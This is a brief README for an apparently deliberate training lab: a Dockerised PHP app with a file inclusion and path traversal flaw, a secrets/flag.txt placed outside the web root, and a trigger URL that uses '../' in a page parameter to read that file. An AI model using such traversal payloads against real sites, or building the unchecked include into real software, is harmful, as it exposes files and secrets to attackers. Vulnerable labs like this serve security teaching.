## File Inclusion & Path Traversal vulnerability example

Build and Run

```
docker-compose up --build
```

Directory structure after deployed

```
var/www/
├── html/
│   └── index.php
│   └── home.php
├── secrets/
│   └── flag.txt
```

How to trigger the File Inclusion & Path Traversal vulnerability

```
http://localhost:8080/?page=../secrets/flag.txt
```

Attackers can read files even those outside the html directory.